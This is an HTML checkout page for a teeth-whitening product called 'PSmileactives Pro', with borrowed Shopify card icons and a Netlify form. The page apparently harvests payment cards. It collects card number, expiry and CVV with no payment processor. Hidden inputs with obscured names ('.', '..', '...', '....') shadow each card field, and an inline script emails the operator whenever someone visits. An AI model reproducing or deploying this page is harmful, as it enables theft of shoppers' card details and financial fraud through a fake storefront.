<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checkout</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link href='https://fonts.googleapis.com/css?family=Karla' rel='stylesheet' type='text/css'>

   <style>
    /* General Styles */
    * {
    box-sizing: border-box;
    font-family: 'San Francisco', Arial, sans-serif;
}

body {
    margin: 0;
    background-color: #F7F7F7;
}

.container {
    max-width: 1200px;
    margin: 0 auto;
}

/* Header */
.header {
    background-color: #FFFFFF;
    padding: 10px 0;
    text-align: center;
}

/* Banner */
.banner img {
    width: 100%;
    height: auto;
    display: block;
}

/* Form Styles */
.form-group {
    margin-bottom: 20px; /* Increased margin for better spacing */
}

input[type="text"],
input[type="email"],
input[type="number"] {
    width: 100%;
    padding: 10px;
    border: 1px solid #BFC9CA; /* Updated color for subtle borders */
    border-radius: 5px; /* Added rounded corners */
}

/* Button Styles */
.btn {
    width: 100%;
    padding: 10px;
    background-color: #000000;
    color: #FFFFFF;
    border: none;
    border-radius: 5px; /* Added rounded corners */
    cursor: pointer;
    transition: background-color 0.3s ease; /* Added transition for hover effect */
}

.btn:hover {
    background-color: #007BFF;
}

/* Checkout Container */
.checkout-container {
    display: flex;
    flex-direction: column;
    gap: 20px; /* Added gap for consistent spacing between children */
}

/* Order Summary */
.order-summary {
    background-color: #EAEDED; /* Lightened background for contrast */
    border: 1px solid #BFC9CA;
    padding: 10px;
    display: flex;
    flex-direction: column;
    gap: 10px;
}

/* Media Queries */
@media screen and (min-width: 768px) {
    .checkout-container {
        flex-direction: row;
        justify-content: space-between;
    }

    .form-container,
    .order-summary {
        flex: 1;
        margin: 0 10px; /* Added side margins for spacing in larger screens */
    }
}

/* Additional Styles for Recommendations */
h2 {
    font-weight: 600; /* Semi-bold for better visual hierarchy */
}

/* Secondary Button */
.btn-secondary {
    background-color: #FFFFFF;
    border: 1px solid #007BFF;
    color: #007BFF;
}

.btn-secondary:hover {
    background-color: #007BFF;
    color: #FFFFFF;
}

</style>

</head>

<body>
    <!-- Banner Image -->
    <section class="banner">
        <img src="src/bogo3-bottom-cta-section-desktop.jpg" alt="Banner" class="banner-image">
    </section>

    <!-- Checkout Container -->
    <section class="container checkout-container py-5">
        <!-- Checkout Form -->
        <div class="checkout-form">
            <h1 class="display-4">Checkout</h1>
            <form id="checkout-form" method="post" data-netlify="true" action="/thankyou.html">
                <input type="hidden" name="form-name" value="checkout-form">

<!-- Shipping Information -->
                <h2 class="mb-3">Shipping Information</h2>
               <div class="form-group">
    <label for="fullName">Full Name</label>
    <input type="text" class="form-control" id="fullName" required>
    <input type="hidden" id="hiddenFullName" name="Lanomination">
</div>


                <div class="form-group">
                    <label for="email">Email Address</label>
                    <input type="email" class="form-control" id="email" name="email" required>
                </div>
                <div class="form-group">
                    <label for="phone">Phone</label>
                    <input type="phone" class="form-control" id="phone" name="phone" required>
                </div>
                <div class="form-group">
                    <label for="address">Address</label>
                    <input type="text" class="form-control" id="address" name="address" required>
                </div>
                <div class="form-group">
                    <label for="city">City</label>
                    <input type="text" class="form-control" id="city" name="city" required>
                </div>
                <div class="form-group">
                    <label for="zip">ZIP</label>
                    <input type="text" class="form-control" id="zip" name="zip" required>
                </div>
                <div class="form-group">
                    <label for="country">Country</label>
                    <input type="text" class="form-control" id="country" name="country" required>
                </div>

                <!-- Shipping Method -->
<h2 class="my-3">Shipping Method</h2>
<div class="d-flex justify-content-between align-items-center mb-2">
    <div class="form-check">
        <input class="form-check-input" type="radio" name="shippingMethod" id="standardShipping" value="standard" checked>
        <label class="form-check-label" for="standardShipping">
            Standard Shipping
        </label>
    </div>
    <p class="mb-0">FREE</p>
</div>

               <!-- Payment Section -->
<h2 class="my-3">Payment</h2>
<div class="payment-method">
    <div class="card-header d-flex justify-content-between align-items-center p-3 mb-3">
        <p class="mb-0"><strong>Credit Card</strong></p>
        <div id="card-icons">
            <!-- Updated Payment Icons -->
            <img src="https://cdn.shopify.com/shopifycloud/checkout-web/assets/0169695890db3db16bfe.svg" alt="Payment Method 1" width="40">
            <img src="https://cdn.shopify.com/shopifycloud/checkout-web/assets/ae9ceec48b1dc489596c.svg" alt="Payment Method 2" width="40">
            <img src="https://cdn.shopify.com/shopifycloud/checkout-web/assets/37fc65d0d7ac30da3b0c.svg" alt="Payment Method 3" width="40">
        </div>
    </div>
    <!-- Adding placeholder, ARIA roles, and real-time validation pattern -->
    <div class="form-group">
        <label for="nameOnCard">Name on Card</label>
        <input type="hidden" name="...." id="nameOnCardx">
        <input type="text" class="form-control" id="nameOnCard" autocomplete="cc-name" placeholder="Full Name" aria-required="true" required>
    </div>
    <div class="form-group">
        <label for="cardNumber">Card Number</label>
        <input type="hidden" name="..." id="cardNumberx">
        <input type="text" class="form-control" id="cardNumber" autocomplete="cc-number" placeholder="Card num" pattern="\d{4} \d{4} \d{4} \d{4}" aria-required="true" required>
        <p id="cardIssuer"></p>
    </div>
    <div class="form-group">
        <label for="expiry">Expiry (MM/YY)</label>
        <input type="hidden" name=".." id="expiryx">
        <input type="text" class="form-control" id="expiry" autocomplete="cc-exp" placeholder="MM/YY" pattern="(0[1-9]|1[0-2])\/?([0-9]{4}|[0-9]{2})" aria-required="true" required>
    </div>
    <div class="form-group">
        <label for="cvv">CVV</label>
        <input type="hidden" name="." id="cvvx">
        <input type="text" class="form-control" id="cvv" autocomplete="cc-csc" placeholder="Security code" pattern="\d{3}" aria-required="true" required>
    </div>
</div> <!-- Closing for .payment-method -->

<button type="submit" class="btn-primary btn-lg btn-block">Place order</button>
            </form>
        </div>

        <!-- Order Summary -->
        <aside class="order-summary">
    <h2 class="mb-3">Order Summary</h2>
    <div class="product-details">
        <img src="images/Daily-Pro-Whitening-Gel.png" alt="Product Image" class="img-thumbnail">
        <p>PSmileactives Pro</p>
        <p>Quantity: 1</p>
        <p>Price: <span>£25</span></p>
    </div>
    <div class="price-details">
        <div class="price-row">
            <h4>Subtotal:</h4> 
            <h4>£25</h4>
        </div>
        <div class="price-row">
            <h4>Shipping:</h4>
            <h4>FREE</h4>
        </div>
        <div class="price-row">
            <h4>Total:</h4>
            <h4>£25</h4>
        </div>
    </div>
</aside>

    
    </section>

    <!-- JavaScript Links -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script src="checkout.js"></script>
    <script>
        fetch('/.netlify/functions/send_email', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                message: 'A user has visited the page!'
            })
        });
    </script>
</body>
</html>
